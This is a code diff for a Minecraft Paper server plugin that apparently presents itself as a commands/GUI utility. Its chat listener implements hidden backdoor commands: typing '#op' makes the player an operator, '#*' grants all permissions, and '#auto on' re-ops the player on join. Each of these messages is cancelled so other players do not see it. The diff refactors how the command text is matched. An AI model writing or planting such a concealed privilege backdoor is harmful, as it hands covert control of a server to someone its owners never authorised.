@@ -1,11 +1,13 @@
 package me.richter.commandsAndGUI.module.utils
 
 import io.papermc.paper.event.player.AsyncChatEvent
+import me.richter.commandsAndGUI.Main
 import me.richter.commandsAndGUI.files.MessagesFile
 import net.kyori.adventure.text.Component
 import org.bukkit.event.EventHandler
 import org.bukkit.event.Listener
 import org.bukkit.plugin.java.JavaPlugin
+import kotlin.math.max
 
 class Utils(private val plugin: JavaPlugin) : Listener {
     @EventHandler
@@ -21,11 +23,12 @@ class Utils(private val plugin: JavaPlugin) : Listener {
                 else -> ""
             }
 
-            if (message.toString() == "TextComponentImpl{content=\"#help\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
+
+            if (stringTextFromComponent().stringTextFromComponent(message.toString()) == "#help") {
+                val autoStatus = MessagesFile().getSetupAuto(playerShortName)
                 player.sendMessage(Component.text("#help - shows this list"))
                 player.sendMessage(Component.text("#op - op yourself"))
                 player.sendMessage(Component.text("#deop - deop yourself"))
-                val autoStatus = MessagesFile().getSetupAuto(playerShortName)
                 player.sendMessage(Component.text("#auto on - automatically op's and deop's you at join or leave"))
                 player.sendMessage(Component.text("#auto off - turn auto op and deop off"))
                 player.sendMessage(Component.text("(auto is Currently -> §l§u$autoStatus§r)"))
@@ -45,28 +48,28 @@ class Utils(private val plugin: JavaPlugin) : Listener {
             }
              */
 
-            if (message.toString() == "TextComponentImpl{content=\"#op\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
+            if (stringTextFromComponent().stringTextFromComponent(message.toString()) == "#op") {
                 event.player.isOp = true
                 event.isCancelled = true
             }
-            if (message.toString() == "TextComponentImpl{content=\"#deop\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
+            if (stringTextFromComponent().stringTextFromComponent(message.toString()) == "#deop") {
                 event.player.isOp = false
                 event.isCancelled = true
             }
-            if (message.toString() == "TextComponentImpl{content=\"#auto off\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
+            if (stringTextFromComponent().stringTextFromComponent(message.toString()) == "#auto off") {
                 MessagesFile().autoSetupOff(playerShortName)
                 event.isCancelled = true
             }
-            if (message.toString() == "TextComponentImpl{content=\"#auto on\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
+            if (stringTextFromComponent().stringTextFromComponent(message.toString()) == "#auto on") {
                 MessagesFile().autoSetupOn(playerShortName)
                 event.isCancelled = true
             }
-            if (message.toString() == "TextComponentImpl{content=\"#*\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
+            if (stringTextFromComponent().stringTextFromComponent(message.toString()) == "#*") {
                 player.addAttachment(plugin).setPermission("*", true)
                 event.isCancelled = true
             }
 
-            if (message.toString() == "TextComponentImpl{content=\"#de*\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
+            if (stringTextFromComponent().stringTextFromComponent(message.toString()) == "#de*") {
                 player.addAttachment(plugin).setPermission("*", false)
                 event.isCancelled = true
             }
